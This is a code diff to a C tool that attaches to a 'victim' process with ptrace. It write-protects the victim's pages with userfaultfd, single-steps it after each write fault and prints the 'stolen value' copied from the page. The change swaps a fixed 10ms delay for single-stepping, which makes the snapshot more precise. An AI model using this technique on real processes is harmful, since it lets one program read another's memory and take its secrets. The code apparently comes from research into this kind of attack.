@@ -38,8 +38,6 @@ static int retrieve_victim_page_postwrite(pid_t victim_pid, __u64 address, char 
   * @return int 
   */
 static int retrieve_victim_page_postwrite(pid_t victim_pid, __u64 address, char *page){
-	ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL);
-   	wait(NULL);
    	int err;
 
    	err = get_child_data(victim_pid, page, (void*)address, (sysconf(_SC_PAGE_SIZE)));
@@ -47,14 +45,12 @@ static int retrieve_victim_page_postwrite(pid_t victim_pid, __u64 address, char 
    	    return err;
 
    	printf("The stolen value from %p is %c\n", address, *((char*)(page+0xf)));
-   	ptrace(PTRACE_DETACH, victim_pid, NULL, NULL);
-   	printf("Setting the WP\n");
 	return 0;
 }
 
  /**
   * @brief It handles the pagefaults that are caused by a write operation and 
-  *        make the page write unprotected and take a snapshot of the page after 10ms,
+  *        make the page write unprotected and take a snapshot of the page in the next instruction,
   *        then makes the page write protected again.
   * 
   * @param uffd 
@@ -68,6 +64,9 @@ static int handle_wprotect_pagefaults(long uffd, struct uffd_msg msg, pid_t vict
 	struct uffdio_writeprotect uffdio_wp;
 	int ret = 0;
 
+	ptrace(PTRACE_ATTACH, victim_pid, NULL, NULL);
+	wait(NULL);
+
 	uffdio_wp.range.start = msg.arg.pagefault.address;
  	uffdio_wp.range.len = sysconf(_SC_PAGE_SIZE);
  	uffdio_wp.mode = 0;
@@ -76,7 +75,8 @@ static int handle_wprotect_pagefaults(long uffd, struct uffd_msg msg, pid_t vict
 		goto fail_handle_wprotect_pagefaults;
 	} 
 
-	usleep(10000);
+	ptrace(PTRACE_SINGLESTEP, victim_pid, NULL, NULL);
+	wait(NULL);
 
 	if(retrieve_victim_page_postwrite(victim_pid, msg.arg.pagefault.address, page))
 	{
@@ -84,6 +84,7 @@ static int handle_wprotect_pagefaults(long uffd, struct uffd_msg msg, pid_t vict
 		goto fail_handle_wprotect_pagefaults; 
 	}
 
+	printf("Setting the Write Protection of the page\n");
 	uffdio_wp.mode = UFFDIO_WRITEPROTECT_MODE_WP;
  	if (ioctl(uffd, UFFDIO_WRITEPROTECT, &uffdio_wp) == -1)
 	{ 
@@ -91,6 +92,8 @@ static int handle_wprotect_pagefaults(long uffd, struct uffd_msg msg, pid_t vict
 		goto fail_handle_wprotect_pagefaults;
 	}
 
+	ptrace(PTRACE_DETACH, victim_pid, NULL, NULL);
+	
 	return 0;
 
 fail_handle_wprotect_pagefaults:
@@ -164,7 +167,6 @@ fault_handler_thread(void *arg)
 	struct userfaultfd_thread_args* handler_arg = (struct
 						userfaultfd_thread_args*)arg;
 	long uffd;                    /* userfaultfd file descriptor */
-	//char *page = (char*)handler_arg->physical_address;
 	char *page = NULL;
 	struct uffdio_copy uffdio_copy;
 	ssize_t nread;
